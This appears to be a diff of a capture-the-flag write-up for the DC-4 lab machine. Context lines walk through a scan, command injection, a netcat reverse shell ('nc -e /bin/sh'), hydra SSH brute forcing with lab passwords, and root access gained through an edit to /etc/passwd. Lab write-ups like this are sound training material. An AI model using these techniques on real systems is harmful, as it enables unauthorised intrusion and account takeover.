@@ -9,6 +9,8 @@ Unlike the previous DC releases, this one is designed primarily for beginners/in
 Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
  
  
+ 
+ 
   # Scaning
   
   ### Reconnaissance 
@@ -22,6 +24,8 @@ Linux skills and familiarity with the Linux command line are a must, as is some 
 Found the IP 192.168.0.158
 
 
+
+
 ### Nmap
 
 nmap -sV -sC -p- 192.168.0.158
@@ -32,11 +36,23 @@ By seeing the result I am not getting where to start, but i seen something new w
 
 
 
+
+
+
+
+
+
 searchsploit nginx 1.15.10
 
 ![Screenshot from 2023-01-26 20-58-00](https://user-images.githubusercontent.com/108471951/214927477-32801d47-1f7c-4633-88e1-a940675af28c.png)
 
 I tried to find a exploit for nginx 1.15.10 but i didt get
+
+
+
+
+
+
 
 ### Http
 
@@ -71,9 +87,23 @@ I tried running the commands that where present there
 
 Since we can run commands that means we can have reverse shell easily
 
+
+
+
+
+
+
+
+
 I intercepted the command request in burp and then sent the netcat command for reverse shell nc+-e/bin/sh IP+PORT
 
 ![Screenshot from 2023-01-26 23-36-05](https://user-images.githubusercontent.com/108471951/214929191-e65549c2-9baa-4a79-ba12-87c2409ba32a.png)
+
+
+
+
+
+
 
 
 Started listening in the given port 1234
@@ -87,11 +117,25 @@ and forweded the request in burp the i got the shell
 
 
 
+
+
+
+
+
+
 For TTY shell
 
 Python Script from gtfobins  https://gtfobins.github.io/gtfobins/python/
 
 ![Screenshot from 2023-01-26 23-40-06](https://user-images.githubusercontent.com/108471951/214930021-66836e7a-4b5a-4a57-a5b4-c02643fe474d.png)
+
+
+
+
+
+
+
+
 
 ## Enumeration
 
@@ -103,12 +147,25 @@ cd /home
 
 I found some users 
 
+
+
+
+
+
 I made them as a users.txt file
+
+mousepad users.txt
 
 ![Screenshot from 2023-01-26 23-48-21](https://user-images.githubusercontent.com/108471951/214930477-d5dba641-b790-4af2-8986-5ebe5a79b564.png)
 
 
 ![Screenshot from 2023-01-26 23-49-00](https://user-images.githubusercontent.com/108471951/214930504-9fab69e8-34c6-4dde-a8aa-b7a059b63f27.png)
+
+
+
+
+
+
 
 
 cd jim
@@ -120,20 +177,46 @@ cd backups
 
 ![Screenshot from 2023-01-26 23-55-16](https://user-images.githubusercontent.com/108471951/214930737-1782edfe-2a90-4efd-b42e-000427d94cc8.png)
 
+
+
+
+
+
+
 I found some old passwords 
 
 
 ![Screenshot from 2023-01-27 00-57-35](https://user-images.githubusercontent.com/108471951/214931309-7e67a38d-68a2-487e-a62c-3bc8f461243a.png)
 
 
+
+
+
+
+
+
+
+
 I made a pass.txt file
+mousepad pass.txt
+
 
 ![Screenshot from 2023-01-27 00-57-04](https://user-images.githubusercontent.com/108471951/214931483-09ce31e8-0b43-4b54-8cb1-c141de2b02be.png)
 
 
+
+
+
+
+
+
+
+
 ### Bruteforce
 
-##### hydra
+
+
+#### hydra
 
 now i bruteforceing the user id and passwords on ssh port which is open
 
@@ -147,10 +230,23 @@ I got the user jim password = jibril04
 
 
 
+
+
+
+
+
+
+
+
 ssh jim@192.168.0.158
 
 
 ![Screenshot from 2023-01-27 00-09-42](https://user-images.githubusercontent.com/108471951/214932330-1c062baa-ae2e-4989-a87e-8dacfde00450.png)
+
+
+
+
+
 
 
 
@@ -167,6 +263,13 @@ This looks like an email. So let’s check out the /var/mail folder to see if we
 
 
 
+
+
+
+
+
+
+
 cd /vra/mail
 
 ![Screenshot from 2023-01-27 00-15-25](https://user-images.githubusercontent.com/108471951/214932779-5e45f284-a4a2-4a93-a60c-e5f5e16b23c1.png)
@@ -177,9 +280,22 @@ HereI found a mail to charles in this there’s a password for user charles
 user/passwd                charles                     ^xHhA&hvim0y 
 
 
+
+
+
+
+
+
+
 su charles
 
 ![Screenshot from 2023-01-27 00-16-19](https://user-images.githubusercontent.com/108471951/214933644-49a9f588-1915-43a3-b27a-8b955bd4ad4b.png)
+
+
+
+
+
+
 
 
 
@@ -197,7 +313,21 @@ We can add a user in /etc/passwd without any password and have that user power o
 
 
 
+
+
+
+
+
+
+
 ![Screenshot from 2023-01-27 00-18-44](https://user-images.githubusercontent.com/108471951/214934790-6517bdca-061d-4bfb-9764-e34ad7012d0d.png)
+
+
+
+
+
+
+
 
 
 
@@ -212,12 +342,23 @@ we cretaed the user Robin
 
 
 
+
+
+
+
 su Robin
 
 whoami
 
 
 ![Screenshot from 2023-01-27 00-26-17](https://user-images.githubusercontent.com/108471951/214935010-fba6abf7-3f0a-416d-aad1-45b2232337db.png)
+ 
+ 
+ 
+ 
+ 
+ 
+ 
  
  
  
@@ -229,12 +370,24 @@ whoami
  
  ls
  
+ 
  cat flag.txt
  
+ 
+ 
+ 
+ 
  ![Screenshot from 2023-01-27 00-27-08](https://user-images.githubusercontent.com/108471951/214935210-2c196d3e-d008-48e8-872b-3678498e1383.png)
+
+
+
+
 
  
 
 Sccesfully I have found the flag.
 
+
+#robinpaul
+@robinpaul
 
